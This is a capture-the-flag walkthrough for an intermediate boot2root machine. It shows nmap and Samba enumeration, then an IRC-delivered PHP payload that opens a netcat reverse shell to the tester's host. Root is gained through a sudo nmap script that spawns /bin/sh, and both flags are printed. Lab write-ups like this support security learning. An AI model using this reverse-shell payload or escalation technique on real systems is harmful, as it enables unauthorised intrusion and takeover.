@@ -1,0 +1,254 @@
+SP-ike is a boot2root intermediate machine.
+IP: 192.168.0.105
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SPikeCTF# nmap -A -T4 -p- 192.168.0.105
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 19:53 IST
+Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
+NSE Timing: About 0.00% done
+Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 100.00% done; ETC: 19:53 (0:00:00 remaining)
+Nmap scan report for 192.168.0.105
+Host is up (0.0016s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+6667/tcp open  irc         InspIRCd
+| irc-info: 
+|   server: irc.ike.local
+|   users: 2
+|   servers: 1
+|   chans: 1
+|   lusers: 2
+|   lservers: 0
+|   source ident: nmap
+|   source host: 192.168.0.106
+|_  error: Closing link: (nmap@192.168.0.106) [Client exited]
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/24%OT=80%CT=1%CU=40618%PV=Y%DS=2%DC=T%G=Y%TM=5F6CABF
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A768%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+
+oot@LAPTOP-U5913CMD:/home/akshay/Desktop/SPikeCTF# enum4linux 192.168.0.105
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 24 19:57:01 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 192.168.0.105
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ===================================================== 
+|    Enumerating Workgroup/Domain on 192.168.0.105    |
+ ===================================================== 
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================= 
+|    Nbtstat Information for 192.168.0.105    |
+ ============================================= 
+Looking up status of 192.168.0.105
+        IKE             <00> -         B <ACTIVE>  Workstation Service
+        IKE             <03> -         B <ACTIVE>  Messenger Service
+        IKE             <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ ====================================== 
+|    Session Check on 192.168.0.105    |
+ ====================================== 
+[+] Server 192.168.0.105 allows sessions using username '', password ''
+
+ ============================================ 
+|    Getting domain SID for 192.168.0.105    |
+ ============================================ 
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================= 
+|    OS information on 192.168.0.105    |
+ ======================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 192.168.0.105 from smbclient: 
+[+] Got OS info for 192.168.0.105 from srvinfo:
+        IKE            Wk Sv PrQ Unx NT SNT ike server (Samba, Ubuntu)
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ============================== 
+|    Users on 192.168.0.105    |
+ ============================== 
+Use of uninitialized value $users in print at ./enum4linux.pl line 874.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 888.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
+
+ ========================================== 
+|    Share Enumeration on 192.168.0.105    |
+ ========================================== 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (ike server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 192.168.0.105
+//192.168.0.105/print$  Mapping: DENIED, Listing: N/A
+//192.168.0.105/IPC$    [E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+ ===================================================== 
+|    Password Policy Information for 192.168.0.105    |
+ ===================================================== 
+
+
+[+] Attaching to 192.168.0.105 using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] IKE
+        [+] Builtin
+
+[+] Password Info for Domain: IKE
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ =============================== 
+|    Groups on 192.168.0.105    |
+ =============================== 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ======================================================================== 
+|    Users on 192.168.0.105 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-3432113166-2337945058-43690880
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1001 Unix User\ike (Local User)
+
+
+I did nikto scan and dirb for directory busting but no results.
+Seems like nothing is there on port 80.
+Even done with the samba share and got nothing with that.
+
+IRC chat relay is the only server that can be vulnerable.
+
+This is the first time I encountered this type of thing in CTFs.
+So I googled for everything related to IRC.
+
+I found out about HexChat and it can be used to connect to the IRC Server.
+
+!php $s=array(); $p=array(); proc_open("mkfifo /tmp/tsglu; nc 192.168.0.106 1234 0</tmp/tsglu | /bin/sh >/tmp/tsglu 2>&1; rm /tmp/tsglu", $s, $p);
+
+This is the payload that I got from HackingArcticles walkthrough.
+We can use this payload to get reverse connection.
+
+I got a reverse shell from the IRC Server.
+
+C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.106] from (UNKNOWN) [192.168.0.105] 58552
+id
+uid=1001(ike) gid=1001(ike) groups=1001(ike),27(sudo)
+
+ike@ike:~$ ls
+ls
+flag.txt  ircbot  irc.log  php-errors.log
+ike@ike:~$ cat flag.txt
+cat flag.txt
+cdca0db3c1d9a7290
+ike@ike:~$
+
+Privilege Escalation:
+
+ike@ike:~$ sudo -l
+sudo -l
+Matching Defaults entries for ike on ike:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ike may run the following commands on ike:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/nmap
+
+
+ike@ike:~$ TF=$(mktemp)
+TF=$(mktemp)
+ike@ike:~$ echo 'os.execute("/bin/sh")' > $TF
+echo 'os.execute("/bin/sh")' > $TF
+
+ike@ike:~$ sudo nmap --script=$TF
+sudo nmap --script=$TF
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-24 17:03 CEST
+NSE: Warning: Loading '/tmp/tmp.5MeZmJCutM' -- the recommended file extension is '.nse'.
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# cd /root
+# ls
+flag.txt
+# cat flag.txt
+d8f8254074369b6
+
+Thank you...Happy Hacking :)
